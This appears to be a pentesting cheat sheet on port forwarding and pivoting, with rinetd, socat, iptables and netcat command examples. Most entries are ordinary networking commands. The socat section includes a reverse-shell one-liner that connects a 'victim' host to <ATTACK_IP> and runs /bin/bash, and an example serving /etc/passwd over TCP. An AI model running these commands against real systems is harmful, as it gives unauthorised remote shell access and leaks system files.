# 🔌 Port Forwarding

> Redirect traffic between hosts/networks.
> Useful in pentesting for pivoting, lateral movement, and firewall bypass.

## ⚡ Rinetd – Simple TCP redirection

```bash
# /etc/rinetd.conf
<LISTEN_IP> <LISTEN_PORT> <TARGET_IP> <TARGET_PORT>
0.0.0.0 8080 10.10.10.10 80
```

```bash
rinetd -c /etc/rinetd.conf
```

## 🛠️ Socat – Swiss Army Knife

```bash
# Basic port forwarding
socat TCP-LISTEN:<LOCAL_PORT>,fork TCP:<REMOTE_IP>:<REMOTE_PORT>
```

### MITM / Traffic Sniffing

```bash
socat -v TCP-LISTEN:1234,fork TCP:10.10.10.10:80
```

### Encrypted tunnel (SSL/TLS)

```bash
socat OPENSSL-LISTEN:8443,cert=cert.pem,key=key.pem,fork TCP:127.0.0.1:80
```

### Conversion & Sharing

```bash
# UDP -> TCP
socat UDP-LISTEN:1234,fork TCP:127.0.0.1:5678
```

```bash
# Serve file
socat -v TCP-LISTEN:8888,fork OPEN:/etc/passwd,rdonly

# Client
socat - TCP:<SERVER_IP>:8888 > reçu.txt
```

### Reverse shell (nc equivalent)

```bash
# Listener
socat TCP-LISTEN:4444,reuseaddr,fork -
# Victim
socat TCP:<ATTACK_IP>:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

## 🔒 Iptables / nftables port forwarding

```bash
# Redirect local port 8080 -> remote 10.10.10.10:80
iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to 10.10.10.10:80
iptables -t nat -A POSTROUTING -j MASQUERADE
```

## 📡 Netcat

### Simple port forwarding

```bash
# Forward local port 8080 to remote host:80
mkfifo /tmp/f; nc -lvp 8080 < /tmp/f | nc 10.10.10.10 80 > /tmp/f
```
